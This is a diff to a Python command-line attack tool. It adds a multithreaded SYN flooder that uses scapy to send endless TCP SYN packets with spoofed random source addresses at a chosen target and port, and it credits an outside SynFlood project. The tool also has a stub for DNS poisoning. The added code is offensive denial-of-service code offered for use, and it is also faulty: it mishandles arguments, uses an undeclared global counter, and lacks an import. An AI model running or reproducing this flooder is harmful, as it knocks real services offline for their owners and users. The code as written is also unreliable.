@@ -1,7 +1,35 @@
 import socket, random, sys, threading
 import cmd
+import logging
 import string, sys
 from scapy.all import *
+
+
+#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+if os.geteuid() != 0:
+    sys.exit("[!] Please run as root")
+    
+total = 0
+conf.iface='en1';#network card XD
+
+
+class sendSYN(threading.Thread):
+        global target, port
+        def __init__(self):
+                threading.Thread.__init__(self)
+        def run(self):
+                i = IP()
+                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+                i.dst = target
+
+                t = TCP()
+                t.sport = random.randint(1,65535)
+                t.dport = port
+                t.flags = 'S'
+
+                send(i/t, verbose=0)
+
  
 class CLI(cmd.Cmd):
 
@@ -25,6 +53,26 @@ class CLI(cmd.Cmd):
     def do_dns(self, arg):
 	"""DNS Poisioning."""	
     
+    def do_syn(self, target, port ):
+	"""syn [target ip] [port]
+    #########################################
+    # 
+    # SYNflood - A multithreaded SYN Flooder
+    # author: arthurnn
+    #
+    #
+    #########################################
+
+	   SYN flood: https://github.com/arthurnn/SynFlood  
+	    """
+	print "Flooding %s:%i with SYN packets." % (target, port)
+        
+	while 1:
+	    sendSYN().start()
+	    total += 1
+	    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+	
+	
     def help_hello(self):
         print "syntax: hello [message]",
         print "-- prints a hello message"
@@ -41,11 +89,16 @@ class CLI(cmd.Cmd):
 
 #
 # try it out
-if os.geteuid() != 0:
-    sys.exit("[!] Please run as root")
-
 cli = CLI()
 cli.cmdloop()
+'''if os.geteuid() != 0:
+    sys.exit("[!] Please run as root")
+    
+total = 0
+conf.iface='en1';#network card XD
+
+cli = CLI()
+cli.cmdloop()'''
 
    
 '''
